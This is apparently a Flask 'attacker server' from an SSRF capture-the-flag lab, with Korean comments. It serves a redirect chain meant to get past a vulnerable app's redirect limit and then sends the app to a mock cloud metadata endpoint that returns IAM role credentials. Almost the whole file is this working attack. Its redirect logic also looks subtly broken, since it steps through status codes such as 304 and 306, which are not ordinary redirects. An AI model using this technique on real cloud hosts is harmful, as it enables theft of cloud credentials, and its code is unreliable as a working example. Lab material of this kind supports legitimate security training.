"""
[공격자 서버 예시]

이 파일은 참가자가 직접 구성해야 하는 리다이렉트 체인 서버의 예시입니다.
취약한 앱(vulnerable-app)이 접근 가능한 호스트에서 실행해야 합니다.

실행 방법:
  pip install flask
  python attacker_server_example.py

요구 조건:
  - vulnerable-app(10.0.0.2)이 이 서버에 접근 가능해야 함
  - Docker 환경 내부에서 실행하거나, 같은 네트워크에 있어야 함
"""

from flask import Flask, redirect, request

app = Flask(__name__)

# 최종 목표: 모의 메타데이터 서버의 IAM 자격증명 엔드포인트
# vulnerable-app 내부 네트워크에서만 접근 가능한 주소
TARGET = "http://10.0.0.10/latest/meta-data/iam/security-credentials/ctf-ec2-role"


@app.route('/start')
def start():
    """
    진입점. 리다이렉트 체인을 시작한다.
    vulnerable-app에 이 URL을 전달:
      POST /fetch  url=http://<공격자IP>:<포트>/start
    """
    return redirect("/r?c=0", code=302)


@app.route('/r')
def redir():
    """
    카운터(c)를 증가시키며 리다이렉트를 반복한다.
    상태코드를 302부터 순차 증가시켜 MAX_REDIRECTS(5) 초과를 유도.
    c >= 6 이 되는 시점에 진짜 목표(메타데이터)로 이동.
    """
    c = int(request.args.get('c', 0)) + 1

    if c >= 6:
        # MAX_REDIRECTS 초과 후 메타데이터로 리다이렉트
        return redirect(TARGET, code=302)

    # 302, 303, 304, 305, 306 순으로 증가
    status_code = 302 + c
    return redirect(f"/r?c={c}", code=status_code)


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=4000, debug=False)
